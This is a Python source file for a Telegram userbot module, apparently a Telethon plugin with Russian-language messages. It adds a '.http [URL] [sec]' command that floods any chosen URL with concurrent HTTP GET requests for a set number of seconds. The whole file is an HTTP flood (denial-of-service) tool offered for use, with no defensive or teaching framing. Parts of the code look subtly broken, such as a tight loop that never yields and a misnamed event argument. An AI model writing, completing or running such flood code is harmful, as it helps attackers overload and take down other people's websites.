import asyncio
import aiohttp
from telethon import events

class HttpFloodModule:
    def __init__(self, bot):
        self.bot = bot
        self.bot.add_event_handler(self.http_command, events.NewMessage(patterns='.http'))

    async def http_command(self, event):
        args = event.text.split()[1:]
        if len(args) != 2:
            await event.reply("Использование: .http [URL] [sec]")
            return

        url, sec = args
        try:
            sec = int(sec)
        except ValueError:
            await event.reply("Время должно быть числом.")
            return

        await event.reply(f"Начинаем отправку HTTP-запросов на {url} на {sec} секунд...")
        await self.http_flood(url, sec)
        await event.reply("Отправка HTTP-запросов завершена.")

    async def http_flood(self, url, duration):
        async with aiohttp.ClientSession() as session:
            end_time = asyncio.get_event_loop().time() + duration
            while True:
                if asyncio.get_event_loop().time() >= end_time:
                    break
                asyncio.create_task(self.send_request(session, url))

    async def send_request(self, session, url):
        try:
            async with session.get(url) as response:
                await response.text()
        except Exception as e:
            print(f"Ошибка запроса: {e}")

# Предполагается, что `bot` - это ваш экземпляр Telethon
my_bot = ...
module = HttpFloodModule(my_bot)
